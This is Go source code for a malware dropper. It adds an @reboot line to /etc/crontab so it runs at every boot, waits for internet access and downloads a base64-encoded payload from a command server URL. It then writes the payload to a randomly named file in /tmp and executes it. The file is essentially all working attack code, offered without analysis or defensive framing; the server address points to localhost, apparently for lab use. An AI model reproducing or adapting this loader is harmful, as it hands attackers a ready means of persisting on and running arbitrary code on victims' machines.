package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	HOME = "http://127.0.0.1:5000/update"
)

var (
	PAYLOAD []byte
	FILE string
)

func main() {
	fmt.Println("Hello friend")
	if !has_persisted() {
		persist()
	}
	for !has_internet_access() {
		time.Sleep(time.Minute)
	}
	fetch_payload()
	fmt.Println("Deploying :|")
	deploy(PAYLOAD)
	fmt.Println("[*] Done")
}

func has_persisted() bool {
	flag := "alpha"
	file, _ := os.Open("/etc/crontab")
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, flag) {
			return true
		}
	}
	return false
}

func persist() {
	path, _ := os.Executable()
	new_job := fmt.Sprintf("@reboot %s", path)
	crontab, _ := os.OpenFile("/etc/crontab", os.O_APPEND|os.O_WRONLY, 0644)
	scanner := bufio.NewScanner(crontab)
	var content string
	for scanner.Scan() {
		content = scanner.Text() + "\n"
	}
	content += new_job + "\n"
	crontab.Write([]byte(content))
}

func has_internet_access() bool {
	_, err := http.Get("https://www.google.com")
	return err == nil
}

func fetch_payload() {
	client := &http.Client{}
	request, _ := http.NewRequest(http.MethodGet, HOME, nil)
	resp, _ := client.Do(request)
	body := resp.Body
	b64content, _ := io.ReadAll(body)
	b64str := string(b64content)
	result := b64str[2:len(b64str)-1]
	PAYLOAD, _ = b64.StdEncoding.DecodeString(string(result))
}

func deploy(payload []byte) {
	rand.Seed(time.Now().UnixNano())
	file_name := fmt.Sprintf("log-%d", (rand.Intn(9999-1111)+1111))
	FILE = fmt.Sprintf("/tmp/%s", file_name)
	file, _ := os.OpenFile(FILE, os.O_CREATE|os.O_WRONLY, 0766)
	file.Write(PAYLOAD)
	fmt.Println(FILE)
	file.Close()
	cmd := exec.Command(FILE)
	cmd.Start()
	cmd.Wait()
}
